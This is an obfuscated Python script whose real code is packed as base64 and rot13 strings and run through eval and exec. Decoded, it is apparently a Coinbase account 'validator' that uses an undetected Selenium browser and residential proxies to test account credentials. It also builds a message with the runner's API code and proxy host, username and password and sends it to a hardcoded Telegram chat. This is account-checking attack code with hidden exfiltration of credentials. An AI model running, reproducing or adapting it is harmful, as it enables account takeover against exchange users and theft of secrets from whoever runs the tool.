import base64, codecs
magic = 'aW1wb3J0IHJlcXVlc3RzICxzeXMgLG9zICx6aXBmaWxlICx0aW1lICNsaW5lOjEKZnJvbSBjb25jdXJyZW50IC5mdXR1cmVzIGltcG9ydCBQcm9jZXNzUG9vbEV4ZWN1dG9yICNsaW5lOjIKZnJvbSBjb25jdXJyZW50IC5mdXR1cmVzIGltcG9ydCBhc19jb21wbGV0ZWQgI2xpbmU6Mwpmcm9tIHB5dmlydHVhbGRpc3BsYXkgaW1wb3J0IERpc3BsYXkgI2xpbmU6NApmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlICNsaW5lOjUKZnJvbSBjb2xvcmFtYSBpbXBvcnQgaW5pdCAjbGluZTo2CmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwICNsaW5lOjcKaW1wb3J0IHNlbGVuaXVtd2lyZSAudW5kZXRlY3RlZF9jaHJvbWVkcml2ZXIgLnYyIGFzIHVjICNsaW5lOjgKZnJvbSBzZWxlbml1bSBpbXBvcnQgd2ViZHJpdmVyICNsaW5lOjEwCmZyb20gc2VsZW5pdW0gLndlYmRyaXZlciAuY29tbW9uIC5ieSBpbXBvcnQgQnkgI2xpbmU6MTEKZnJvbSBzZWxlbml1bSAud2ViZHJpdmVyIC5jb21tb24gLmtleXMgaW1wb3J0IEtleXMgI2xpbmU6MTIKZnJvbSBzZWxlbml1bSAud2ViZHJpdmVyIC5jb21tb24gLmFjdGlvbl9jaGFpbnMgaW1wb3J0IEFjdGlvbkNoYWlucyAjbGluZToxMwpmcm9tIHNlbGVuaXVtIC53ZWJkcml2ZXIgLnN1cHBvcnQgLndhaXQgaW1wb3J0IFdlYkRyaXZlcldhaXQgI2xpbmU6MTQKZnJvbSBzZWxlbml1bSAud2ViZHJpdmVyIC5zdXBwb3J0IGltcG9ydCBleHBlY3RlZF9jb25kaXRpb25zIGFzIEVDICNsaW5lOjE1CmZyb20gc2VsZW5pdW0gLndlYmRyaXZlciAuY2hyb21lIC5vcHRpb25zIGltcG9ydCBPcHRpb25zICNsaW5lOjE2CmZyb20gc2VsZW5pdW0gLmNvbW1vbiAuZXhjZXB0aW9ucyBpbXBvcnQgVGltZW91dEV4Y2VwdGlvbiAjbGluZToxNwpmcm9tIGRvdGVudiBpbXBvcnQgbG9hZF9kb3RlbnYgI2xpbmU6MTgKaW1wb3J0IGNocm9tZWRyaXZlcl9iaW5hcnkgI2xpbmU6MTkKaW5pdCAoYXV0b3Jlc2V0ID1UcnVlICkjbGluZToyMQpkaXNwbGF5ID1EaXNwbGF5ICh2aXNpYmxlID0wICxzaXplID0oODAwICw4MDAgKSkjbGluZToyMgpkaXNwbGF5IC5zdGFydCAoKSNsaW5lOjIzCnRyeSA6I2xpbmU6MjYKICBvcyAubWtkaXIgKCdyZXN1bHQnKSNsaW5lOjI3CmV4Y2VwdCA6I2xpbmU6MjgKICBwYXNzICNsaW5lOjI5CmNiID1mJycnICAgICAgCntGb3JlLkxJR0hUR1JFRU5fRVh9ICAgICAgICAgKSAoICAgICAgICkgICAgICAgICAgICAgICggICAgICAgIAp7Rm9yZS5MSUdIVEdSRUVOX0VYfSAgICggICggLyggKVwgKSAoIC8oICAgKCAgICAoICAgICApXCApICAgICAKe0ZvcmUuTElHSFRHUkVFTl9FWH0gICApXCApXCgpfCgpLyggKVwoKSkoIClcICAgKVwgICAoKCkvKCggICAgCntGb3JlLkxJR0hUR1JFRU5fRVh9ICgoKF98KF8pXCAvKF8pfChfKVwgKSgoX3woKChfKSggIC8oXykpXCAgIAp7Rm9yZS5MSUdIVEdSRUVOX0VYfSApXF9fXyAoKF98XykpICBfKChffChfKV8gKVwgXyApXChfKSkoKF8pICAKe0ZvcmUuTElHSFRHUkVFTl9FWH0oKC8gX18vIF8gXF8gX3x8IFx8IHx8IF8gKShfKV9cKF8pIF9ffCBfX3wgCntGb3JlLkxJR0hUR1JFRU5fRVh9IHwgKF98IChfKSB8IHwgfCAuYCB8fCBfIFwgLyBfIFwgXF9fIFwgX3wgIAp7Rm9yZS5MSUdIVEdSRUVOX0VYfSAgXF9fX1xfX18vX19ffHxffFxffHxfX18vL18vIFxfXHxfX18vX19ffCAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAp7Rm9yZS5MSUdIVENZQU5fRVh9ICAgICAgICAgICAgICAgIFZBTElEQVRPUiBDTEkgICAgCicnJyNsaW5lOjQzCnByaW50IChmJ3tjYn17Rm9yZS5SRVNFVH09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09XG5cbicpI2xpbmU6NDYKZGVmIGxvZ2luIChPME8wMDAwTzBPT08wTzBPMCApOiNsaW5lOjUwCiAgbG9hZF9kb3RlbnYgKCkjbGluZTo1MQogIE9PTzAwTzBPTzAwME9PTzAwID1vcyAuZ2V0ZW52ICgndXNlcm5hbWUnKSNsaW5lOjUyCiAgT09PTzBPT09PME9PME8wTzAgPW9zIC5nZXRlbnYgKCdwYXNzd29yZCcpI2xpbmU6NTMKICBPME9PMDAwMDBPTzBPT09PTyA9b3MgLmdldGVudiAoJ2hvc3QnKSNsaW5lOjU0CiAgT08wTzAwME8wME8wT08wTzAgPW9zIC5nZXRlbnYgKCdwb3J0JykjbGluZTo1NQogIE9PMDBPMDBPTzBPT08wTzBPID17J3ZlcmlmeV9zc2wnOlRydWUgLCdwcm94eSc6eydodHRwJzpmJ2h0dHA6Ly97T09PMDBPME9PMDAwT09PMDB9OntPT09PME9PT08wT08wTzB'
love = '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'
god = 'hvc3QnKSNsaW5lOjkwCiAgICAgICAgICBPME9PTzAwMDBPTzAwTzBPTyA9b3BlbiAoJ3Jlc3VsdC9kaWUudHh0JywnYSsnKSNsaW5lOjkxCiAgICAgICAgICBPME9PTzAwMDBPTzAwTzBPTyAud3JpdGUgKCdcbicpI2xpbmU6OTIKICAgICAgICAgIE8wT09PMDAwME9PMDBPME9PIC53cml0ZWxpbmVzIChPME8wMDAwTzBPT08wTzBPMCApI2xpbmU6OTMKICAgICAgICAgIE8wT09PMDAwME9PMDBPME9PIC5jbG9zZSAoKSNsaW5lOjk0CiAgICAgICAgICBPME8wMDAwTzBPMDBPTzAwTyAucXVpdCAoKSNsaW5lOjk1CiAgICAgIGV4Y2VwdCA6I2xpbmU6OTYKICAgICAgICBwcmludCAoZid7Rm9yZS5MSUdIVFdISVRFX0VYfVsjXXtGb3JlLkxJR0hUR1JFRU5fRVh9IHtPME8wMDAwTzBPT08wTzBPMH0ge0ZvcmUuTElHSFRXSElURV9FWH09e0ZvcmUuTElHSFRZRUxMT1dfRVh9IENhcHRjaGF7Rm9yZS5MSUdIVFdISVRFX0VYfSB+IENCe0ZvcmUuTElHSFRCTFVFX0VYfSBieSBRcmlzX0dob3N0JykjbGluZTo5NwogICAgICAgIE8wT09PMDAwME9PMDBPME9PID1vcGVuICgncmVzdWx0L3Byb3h5LnR4dCcsJ2ErJykjbGluZTo5OAogICAgICAgIE8wT09PMDAwME9PMDBPME9PIC53cml0ZSAoJ1xuJykjbGluZTo5OQogICAgICAgIE8wT09PMDAwME9PMDBPME9PIC53cml0ZWxpbmVzIChPME8wMDAwTzBPT08wTzBPMCApI2xpbmU6MTAwCiAgICAgICAgTzBPT08wMDAwT08wME8wT08gLmNsb3NlICgpI2xpbmU6MTAxCiAgICAgICAgTzBPMDAwME8wTzAwT08wME8gLnF1aXQgKCkjbGluZToxMDIKICBleGNlcHQgOiNsaW5lOjEwMwogICAgcHJpbnQgKGYne0ZvcmUuTElHSFRXSElURV9FWH1bI117Rm9yZS5MSUdIVEdSRUVOX0VYfSB7TzBPMDAwME8wT09PME8wTzB9IHtGb3JlLkxJR0hUV0hJVEVfRVh9PXtGb3JlLkxJR0hUWUVMTE9XX0VYfSBCYWQgUHJveHl7Rm9yZS5MSUdIVFdISVRFX0VYfSB+IENCe0ZvcmUuTElHSFRCTFVFX0VYfSBieSBRcmlzX0dob3N0JykjbGluZToxMDQKICAgIE8wT09PMDAwME9PMDBPME9PID1vcGVuICgncmVzdWx0L3Byb3h5LnR4dCcsJ2ErJykjbGluZToxMDUKICAgIE8wT09PMDAwME9PMDBPME9PIC53cml0ZSAoJ1xuJykjbGluZToxMDYKICAgIE8wT09PMDAwME9PMDBPME9PIC53cml0ZWxpbmVzIChPME8wMDAwTzBPT08wTzBPMCApI2xpbmU6MTA3CiAgICBPME9PTzAwMDBPTzAwTzBPTyAuY2xvc2UgKCkjbGluZToxMDgKICAgIE8wTzAwMDBPME8wME9PMDBPIC5xdWl0ICgpI2xpbmU6MTA5CmRlZiBzZW5kIChPTzAwT09PME8wT09PMDBPMCApOiNsaW5lOjExMgogIGxvYWRfZG90ZW52ICgpI2xpbmU6MTEzCiAgT08wTzAwT08wME8wMDAwME8gPW9zIC5nZXRlbnYgKCd1c2VybmFtZScpI2xpbmU6MTE0CiAgT08wTzAwME9PMDBPTzAwMDAgPW9zIC5nZXRlbnYgKCdwYXNzd29yZCcpI2xpbmU6MTE1CiAgTzBPMDBPME8wT09PTzBPT08gPW9zIC5nZXRlbnYgKCdob3N0JykjbGluZToxMTYKICBPME9PMDBPT09PME8wT09PTyA9b3MgLmdldGVudiAoJ3BvcnQnKSNsaW5lOjExNwogIE8wTzAwT08wME9PME9PME9PID1vcyAuZ2V0ZW52ICgnaXBfcG9ydCcpI2xpbmU6MTE4CiAgTzAwME9PTzAwMDBPME8wT08gPWYnJycKICA8cD5BcGkgQ29kZSA9IHtPTzAwT09PME8wT09PMDBPMH08L3A+CiAgCiAgPHByZT5WYWxpZGF0b3IgQ29pbmJhc2U8L3ByZT4KICAnJycjbGluZToxMjMKICBPME8wTzAwT08wME8wTzBPMCA9ZicnJwogIDxwPkFwaSBDb2RlID0ge09PMDBPT08wTzBPT08wME8wfTwvcD4KICAKICA8Y2VudGVyPlByb3h5IElwIFBvcnQ8L3A+CiAgPHA+U2VydmVyID0ge08wTzAwT08wME9PME9PME9PfTwvcD4KCiAgPGNlbnRlcj5Qcm94eSBSZXNpZG5ldGlhbDwvY2VudGVyPgogIDxwPkhvc3QgPSB7TzBPMDBPME8wT09PTzBPT099PC9wPgogIDxwPlBvcnQgPSB7TzBPTzAwT09PTzBPME9PT099PC9wPgogIDxwPlVzZXJuYW1lID0ge09PME8wME9PMDBPMDAwMDBPfTwvcD4KICA8cD5QYXNzd29yZCA9IHtPTzBPMDAwT08wME9PMDAwMH08L3A+CgoKICA8cHJlPlZhbGlkYXRvciBDb2luYmFzZTwvcHJlPgogICcnJyNsaW5lOjEzOQogIE8wTzBPMDAwT09PTzAwT09PID17J2NoYXRfaWQnOic1Mzc1NjQ0MDk3JywndGV4dCc6TzAwME9PTzAwMDBPME8wT08gLCdwYXJzZV9tb2RlJzonaHRtbCd9I2xpbmU6MTQwCiAgTzAwME9PME8wMDAwT09PMDAgPXsnY2hhdF9pZCc6JzUzNzU2NDQwOTcnLCd0ZXh0JzpPME8wTzAwT08wME8wTzBPMCAsJ'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
